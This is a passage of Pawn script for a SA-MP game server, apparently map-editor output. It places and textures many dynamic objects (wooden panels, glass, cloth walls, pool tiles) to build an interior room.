	SetDynamicObjectMaterial(nebeskaudica, 2, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(nebeskaudica, 3, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(2678,213.619,1762.161,3334.156,90.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 1717, "cj_tv", "green_glass_64", 0x00000000);
	SetDynamicObjectMaterial(nebeskaudica, 1, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(nebeskaudica, 2, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(nebeskaudica, 3, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(2678,213.859,1762.162,3334.350,90.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 1717, "cj_tv", "green_glass_64", 0x00000000);
	SetDynamicObjectMaterial(nebeskaudica, 1, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(nebeskaudica, 2, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(nebeskaudica, 3, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(2678,214.099,1762.142,3334.570,90.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 1717, "cj_tv", "green_glass_64", 0x00000000);
	SetDynamicObjectMaterial(nebeskaudica, 1, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(nebeskaudica, 2, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(nebeskaudica, 3, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(2678,214.360,1762.126,3334.837,90.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 1717, "cj_tv", "green_glass_64", 0x00000000);
	SetDynamicObjectMaterial(nebeskaudica, 1, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(nebeskaudica, 2, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(nebeskaudica, 3, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(2678,214.659,1762.150,3335.091,90.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 1717, "cj_tv", "green_glass_64", 0x00000000);
	SetDynamicObjectMaterial(nebeskaudica, 1, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(nebeskaudica, 2, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(nebeskaudica, 3, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(2678,214.979,1762.166,3335.393,90.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 1717, "cj_tv", "green_glass_64", 0x00000000);
	SetDynamicObjectMaterial(nebeskaudica, 1, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(nebeskaudica, 2, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(nebeskaudica, 3, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(2678,215.299,1762.147,3335.696,90.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 1717, "cj_tv", "green_glass_64", 0x00000000);
	SetDynamicObjectMaterial(nebeskaudica, 1, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(nebeskaudica, 2, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(nebeskaudica, 3, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(2678,215.619,1762.141,3335.975,90.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 1717, "cj_tv", "green_glass_64", 0x00000000);
	SetDynamicObjectMaterial(nebeskaudica, 1, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(nebeskaudica, 2, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(nebeskaudica, 3, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(2678,215.859,1762.137,3336.222,90.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 1717, "cj_tv", "green_glass_64", 0x00000000);
	SetDynamicObjectMaterial(nebeskaudica, 1, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(nebeskaudica, 2, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(nebeskaudica, 3, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(2678,216.138,1762.171,3336.460,90.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 1717, "cj_tv", "green_glass_64", 0x00000000);
	SetDynamicObjectMaterial(nebeskaudica, 1, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(nebeskaudica, 2, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(nebeskaudica, 3, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(2678,216.360,1762.138,3336.683,90.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 1717, "cj_tv", "green_glass_64", 0x00000000);
	SetDynamicObjectMaterial(nebeskaudica, 1, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(nebeskaudica, 2, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(nebeskaudica, 3, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(19834,218.024,1754.446,3332.896,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(19834,218.024,1754.446,3333.198,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(19834,218.024,1754.446,3333.519,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(19834,218.024,1754.446,3333.821,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(19834,218.024,1754.446,3334.122,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(19834,218.024,1754.446,3334.443,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(19834,218.024,1754.446,3334.765,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(19834,218.024,1754.446,3335.086,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(19377,218.204,1753.252,3337.354,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 18031, "cj_exp", "mp_cloth_wall", 0x00000000);
	nebeskaudica = CreateDynamicObjectEx(19377,218.499,1762.547,3337.354,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 18031, "cj_exp", "mp_cloth_wall", 0x00000000);
	nebeskaudica = CreateDynamicObjectEx(2678,216.560,1762.154,3336.893,90.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 1717, "cj_tv", "green_glass_64", 0x00000000);
	SetDynamicObjectMaterial(nebeskaudica, 1, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(nebeskaudica, 2, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(nebeskaudica, 3, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(19357,219.061,1759.366,3338.752,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 18031, "cj_exp", "mp_cloth_wall", 0x00000000);
	nebeskaudica = CreateDynamicObjectEx(19357,219.062,1756.505,3338.752,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 18031, "cj_exp", "mp_cloth_wall", 0x00000000);
	nebeskaudica = CreateDynamicObjectEx(18762,218.960,1760.571,3339.473,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(18762,218.984,1755.348,3339.473,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(2292,220.228,1757.069,3332.713,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 9582, "fort_sfw", "mallfloor2", 0x00000000);
	SetDynamicObjectMaterial(nebeskaudica, 1, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(2291,220.672,1757.072,3332.713,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 9582, "fort_sfw", "mallfloor2", 0x00000000);
	SetDynamicObjectMaterial(nebeskaudica, 1, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(2292,222.108,1757.090,3332.713,0.000,0.000,-90.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 9582, "fort_sfw", "mallfloor2", 0x00000000);
	SetDynamicObjectMaterial(nebeskaudica, 1, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(18762,217.912,1757.081,3334.329,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(2291,220.231,1755.631,3332.713,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 9582, "fort_sfw", "mallfloor2", 0x00000000);
	SetDynamicObjectMaterial(nebeskaudica, 1, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(2291,220.227,1754.665,3332.713,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 9582, "fort_sfw", "mallfloor2", 0x00000000);
	SetDynamicObjectMaterial(nebeskaudica, 1, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(18980,221.671,1755.692,3320.518,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(2256,221.908,1753.391,3334.259,0.000,0.000,-180.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 10765, "airportgnd_sfse", "white", 0xFF000000);
	SetDynamicObjectMaterial(nebeskaudica, 1, -1, "none", "none", 0xFF000000);
	nebeskaudica = CreateDynamicObjectEx(19356,221.448,1753.286,3333.503,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 10765, "airportgnd_sfse", "white", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(19358,223.084,1751.801,3333.589,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(19358,219.883,1751.812,3333.589,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(19358,221.488,1751.662,3335.251,0.000,90.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(19358,221.488,1751.662,3332.728,0.000,90.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(2256,221.056,1753.382,3334.259,0.000,0.000,-180.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 10765, "airportgnd_sfse", "white", 0xFF000000);
	SetDynamicObjectMaterial(nebeskaudica, 1, -1, "none", "none", 0xFF000000);
	nebeskaudica = CreateDynamicObjectEx(19089,217.445,1760.878,3337.380,0.000,90.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(19087,217.446,1760.880,3338.587,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(19089,217.445,1760.878,3337.718,0.000,90.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(19089,217.445,1760.878,3338.034,0.000,90.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(2678,216.830,1762.175,3337.076,90.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 1717, "cj_tv", "green_glass_64", 0x00000000);
	SetDynamicObjectMaterial(nebeskaudica, 1, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(nebeskaudica, 2, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(nebeskaudica, 3, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(2299,222.655,1757.463,3337.072,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 10765, "airportgnd_sfse", "white", 0xFF808080);
	SetDynamicObjectMaterial(nebeskaudica, 2, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(nebeskaudica, 3, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(2082,219.214,1755.948,3337.051,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	SetDynamicObjectMaterial(nebeskaudica, 3, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0x00000000);
	nebeskaudica = CreateDynamicObjectEx(2082,219.194,1758.948,3337.051,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, -1, "none", "none", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(19391,224.114,1762.537,3338.741,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 18031, "cj_exp", "mp_cloth_wall", 0x00000000);
	nebeskaudica = CreateDynamicObjectEx(19391,223.979,1753.254,3338.741,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 18031, "cj_exp", "mp_cloth_wall", 0x00000000);
	nebeskaudica = CreateDynamicObjectEx(1502,223.319,1762.464,3337.111,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 10765, "airportgnd_sfse", "white", 0xFF000000);
	SetDynamicObjectMaterial(nebeskaudica, 1, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(1502,223.187,1753.288,3337.111,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 10765, "airportgnd_sfse", "white", 0xFF000000);
	SetDynamicObjectMaterial(nebeskaudica, 1, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(19377,225.113,1765.038,3335.110,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 18031, "cj_exp", "mp_cloth_wall", 0x00000000);
	nebeskaudica = CreateDynamicObjectEx(19377,225.107,1750.726,3335.110,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 18031, "cj_exp", "mp_cloth_wall", 0x00000000);
	nebeskaudica = CreateDynamicObjectEx(19381,229.847,1760.298,3335.110,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 8550, "laconcha", "vegaspawnwall_128", 0x00000000);
	nebeskaudica = CreateDynamicObjectEx(19381,229.859,1755.462,3335.110,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 8550, "laconcha", "vegaspawnwall_128", 0x00000000);
	nebeskaudica = CreateDynamicObjectEx(19381,227.001,1758.670,3335.110,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 8550, "laconcha", "vegaspawnwall_128", 0x00000000);
	nebeskaudica = CreateDynamicObjectEx(19381,230.288,1757.754,3339.689,0.000,90.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 8550, "laconcha", "vegaspawnwall_128", 0x00000000);
	nebeskaudica = CreateDynamicObjectEx(19376,219.869,1748.409,3337.043,0.000,90.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 4604, "buildblk555", "gm_labuld5_b", 0x00000000);
	nebeskaudica = CreateDynamicObjectEx(19380,225.067,1748.335,3342.356,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14387, "dr_gsnew", "mp_gs_pooltiles", 0x00000000);
	nebeskaudica = CreateDynamicObjectEx(19393,223.981,1753.190,3338.741,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14387, "dr_gsnew", "mp_gs_pooltiles", 0x00000000);
	nebeskaudica = CreateDynamicObjectEx(19380,217.822,1753.185,3342.356,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14387, "dr_gsnew", "mp_gs_pooltiles", 0x00000000);
	nebeskaudica = CreateDynamicObjectEx(19380,218.757,1748.367,3342.356,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14387, "dr_gsnew", "mp_gs_pooltiles", 0x00000000);
	nebeskaudica = CreateDynamicObjectEx(19380,220.611,1749.156,3342.356,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14387, "dr_gsnew", "mp_gs_pooltiles", 0x00000000);
	nebeskaudica = CreateDynamicObjectEx(19325,223.779,1759.176,3334.108,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, -1, "none", "none", 0xFF3C3C3C);
	nebeskaudica = CreateDynamicObjectEx(19325,223.776,1752.541,3334.108,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, -1, "none", "none", 0xFF3C3C3C);
	nebeskaudica = CreateDynamicObjectEx(19089,223.764,1755.040,3336.077,90.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(19089,223.764,1755.040,3332.729,90.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(19089,223.763,1752.139,3336.077,90.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(19089,223.763,1752.139,3332.729,90.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(19089,223.772,1753.353,3336.155,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(19089,223.774,1755.844,3336.155,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(19089,223.759,1758.354,3336.155,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(19089,223.767,1760.739,3336.155,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(19834,218.024,1754.446,3335.364,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(19834,218.024,1754.446,3335.661,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(19408,222.159,1760.831,3333.616,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 18031, "cj_exp", "mp_cloth_wall", 0x00000000);
	nebeskaudica = CreateDynamicObjectEx(19377,220.633,1765.564,3331.720,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 18031, "cj_exp", "mp_cloth_wall", 0x00000000);
	nebeskaudica = CreateDynamicObjectEx(19435,222.305,1760.827,3335.359,90.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 18031, "cj_exp", "mp_cloth_wall", 0x00000000);
	nebeskaudica = CreateDynamicObjectEx(19430,222.618,1761.612,3332.985,0.000,90.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 10765, "airportgnd_sfse", "white", 0xFF000000);
	nebeskaudica = CreateDynamicObjectEx(19430,221.196,1761.575,3334.293,0.000,180.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 10765, "airportgnd_sfse", "white", 0xFF000000);
	nebeskaudica = CreateDynamicObjectEx(19430,223.136,1761.586,3334.293,0.000,180.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 10765, "airportgnd_sfse", "white", 0xFF000000);
	nebeskaudica = CreateDynamicObjectEx(19430,222.032,1762.479,3334.293,0.000,180.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 10765, "airportgnd_sfse", "white", 0xFF000000);
	nebeskaudica = CreateDynamicObjectEx(19430,222.312,1762.466,3334.293,0.000,180.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 10765, "airportgnd_sfse", "white", 0xFF000000);
	nebeskaudica = CreateDynamicObjectEx(19632,222.239,1761.550,3333.065,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, -1, "none", "none", 0xFFFFFFFF);
	nebeskaudica = CreateDynamicObjectEx(19632,222.243,1761.910,3333.065,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, -1, "none", "none", 0xFFFFFFFF);
	nebeskaudica = CreateDynamicObjectEx(19632,222.247,1761.670,3333.175,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, -1, "none", "none", 0xFFFFFFFF);
	nebeskaudica = CreateDynamicObjectEx(19632,221.848,1761.633,3333.065,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, -1, "none", "none", 0xFFFFFFFF);
	nebeskaudica = CreateDynamicObjectEx(18762,226.632,1759.802,3337.112,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(18762,226.622,1755.857,3337.112,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(18762,226.632,1758.472,3337.112,90.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(18762,227.372,1758.472,3339.650,90.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 14650, "ab_trukstpc", "mp_CJ_WOOD5", 0xFF808080);
	nebeskaudica = CreateDynamicObjectEx(2267,226.891,1757.793,3338.364,0.000,0.000,-90.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 10765, "airportgnd_sfse", "white", 0x00000000);
	SetDynamicObjectMaterial(nebeskaudica, 1, 10765, "airportgnd_sfse", "white", 0xFF000000);
	nebeskaudica = CreateDynamicObjectEx(1840,226.600,1758.836,3337.610,0.000,0.000,25.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, -1, "none", "none", 0xFFFFFFFF);
	nebeskaudica = CreateDynamicObjectEx(1840,226.651,1756.753,3337.610,0.000,0.000,-25.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, -1, "none", "none", 0xFFFFFFFF);
	nebeskaudica = CreateDynamicObjectEx(19375,219.793,1767.378,3337.043,0.000,90.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 4604, "buildblk555", "gm_labuld5_b", 0x00000000);
	nebeskaudica = CreateDynamicObjectEx(19390,224.123,1762.581,3338.741,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 8550, "laconcha", "vegaspawnwall_128", 0x00000000);
	nebeskaudica = CreateDynamicObjectEx(19453,218.305,1762.557,3338.729,0.000,0.000,90.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 8550, "laconcha", "vegaspawnwall_128", 0x00000000);
	nebeskaudica = CreateDynamicObjectEx(19453,217.869,1767.365,3338.729,0.000,0.000,0.000,300.000,300.000);
	SetDynamicObjectMaterial(nebeskaudica, 0, 8550, "laconcha", "vegaspawnwall_128", 0x00000000);
